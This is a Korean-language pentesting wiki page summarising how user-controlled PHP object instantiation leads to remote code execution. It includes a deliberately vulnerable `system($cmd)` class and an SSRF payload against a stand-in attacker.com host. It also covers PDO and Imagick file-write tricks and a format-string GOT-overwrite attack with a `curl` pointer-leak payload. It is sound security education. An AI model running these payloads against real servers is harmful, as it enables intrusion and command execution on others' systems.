# PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

이는 기본적으로 [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)의 요약입니다.

## 소개

예를 들어 `new $_GET["a"]($_GET["a"])` 와 같은 임의의 객체 생성은 Remote Code Execution (RCE)로 이어질 수 있으며, 자세한 내용은 [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)에 설명되어 있습니다. 이 문서는 RCE를 달성하기 위한 다양한 전략을 강조합니다.

## RCE via Custom Classes or Autoloading

문법 `new $a($b)` 는 객체를 인스턴스화하는 데 사용되며, **`$a`** 는 클래스 이름을 나타내고 **`$b`** 는 생성자에 전달되는 첫 번째 인수입니다. 이러한 변수들은 GET/POST와 같은 사용자 입력에서 가져올 수 있으며, 문자열이나 배열일 수 있고, JSON에서는 다른 타입으로 나타날 수 있습니다.

아래 코드 스니펫을 살펴보자:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
이 경우 `$a`를 `App` 또는 `App2`로 설정하고 `$b`를 시스템 명령(예: `uname -a`)으로 설정하면 해당 명령이 실행됩니다.

**Autoloading functions**는 그러한 클래스들에 직접 접근할 수 없을 때 악용될 수 있습니다. 이 함수들은 필요할 때 파일에서 클래스를 자동으로 로드하며 `spl_autoload_register` 또는 `__autoload`를 사용하여 정의됩니다:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
오토로딩의 동작은 PHP 버전별로 달라 RCE 가능성이 달라진다.

## RCE via 내장 클래스

커스텀 클래스나 오토로더가 없을 경우, **내장 PHP 클래스**만으로도 RCE에 충분할 수 있다. 이 클래스들의 수는 PHP 버전과 확장에 따라 대략 100에서 200개 사이이다. `get_declared_classes()`로 목록을 확인할 수 있다.

관심 있는 생성자는 리플렉션 API로 식별할 수 있으며, 다음 예제와 링크 [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)에서 확인할 수 있다.

**RCE via 특정 메서드에는 다음이 포함된다:**

### **SSRF + Phar Deserialization**

`SplFileObject` 클래스는 생성자를 통해 SSRF를 유발할 수 있으며, 임의의 URL로의 연결을 허용한다:
```php
new SplFileObject('http://attacker.com/');
```
SSRF는 Phar 프로토콜을 사용하여 PHP 8.0 이전 버전에서 deserialization 공격으로 이어질 수 있습니다.

### **PDOs 악용**

PDO 클래스의 생성자는 DSN 문자열을 통해 데이터베이스에 연결할 수 있게 해주며, 잠재적으로 파일 생성이나 기타 상호작용을 가능하게 합니다:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

libxml2 버전에 따라, PHP의 5.3.22 및 5.4.12까지의 버전은 `SoapClient` 및 `SimpleXMLElement` 생성자를 통한 XXE 공격에 취약했습니다.

## Imagick Extension을 통한 RCE

프로젝트의 **의존성** 분석에서, 새로운 객체를 인스턴스화함으로써 **Imagick**이 **command execution**에 활용될 수 있음이 발견되었습니다. 이는 취약점 악용의 기회를 제공합니다.

### VID parser

VID parser가 파일시스템의 임의 경로에 콘텐츠를 쓸 수 있는 기능이 확인되었습니다. 이는 웹에서 접근 가능한 디렉터리에 PHP 쉘을 배치하여 Remote Code Execution (RCE)을 달성할 수 있음을 의미합니다.

#### VID Parser + File Upload

PHP가 업로드된 파일을 일시적으로 `/tmp/phpXXXXXX`에 저장한다는 점을 이용할 수 있습니다. Imagick의 VID parser는 **msl** 프로토콜을 사용하여 파일 경로의 와일드카드를 처리할 수 있어, 임시 파일을 원하는 위치로 전송하는 것이 가능합니다. 이 방법은 파일시스템 내에서 임의 파일 쓰기를 달성하는 또 다른 방식을 제공합니다.

### PHP Crash + Brute Force

[**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)에 설명된 방법은 삭제되기 전에 서버 크래시를 유발하는 파일을 업로드하는 것을 포함합니다. 임시 파일 이름을 무차별 대입으로 찾으면 Imagick이 임의의 PHP 코드를 실행할 수 있게 됩니다. 다만 이 기법은 오래된 버전의 ImageMagick에서만 효과적이었던 것으로 확인되었습니다.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

사용자 입력이 클래스 이름을 제어할 때(예: `new $_GET['model']()`), PHP 7.0.0에서는 `Throwable` 리팩토링 중 일시적인 버그가 발생하여 엔진이 클래스 이름을 해석하는 과정에서 이를 printf 형식 문자열로 잘못 처리했습니다. 이로 인해 PHP 내에서 고전적인 printf 스타일의 원시 기능들을 활용할 수 있게 되었는데, 예컨대 `%p`로 leak하거나, 너비 지정자로 쓰기 횟수를 제어하고, `%n`으로 프로세스 내 포인터(예: ELF 빌드의 GOT 엔트리)에 임의 쓰기를 수행할 수 있습니다.

최소 재현 취약 패턴:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
공격 개요 (참고 출처):
- Leak 주소를 클래스 이름의 `%p`로 노출시켜 쓰기 가능한 타깃을 찾음:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- 위치 매개변수(positional parameters)와 너비 지정자(width specifiers)를 사용해 정확한 바이트 수를 설정한 다음 `%n`으로 그 값을 스택에서 접근 가능한 주소에 씁니다. 목적은 GOT 슬롯(예: `free`)을 겨냥해 부분적으로 덮어써 `system`으로 연결하는 것입니다.
- 쉘 파이프가 포함된 클래스 이름을 전달하여 하이재킹된 함수(hijacked function)를 트리거해 `system("id")`에 도달시킵니다.

참고:
- PHP 7.0.0에서만 동작(버그 [#71105](https://bugs.php.net/bug.php?id=71105)); 이후 릴리스에서 수정됨. 임의의 클래스 인스턴스화가 가능한 경우 심각도: 치명적.
- 일반적인 페이로드는 스택을 탐색하기 위해 많은 `%p`를 연쇄하고, 그 다음 `%.<width>d%<pos>$n`으로 부분 덮어쓰기를 수행합니다.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
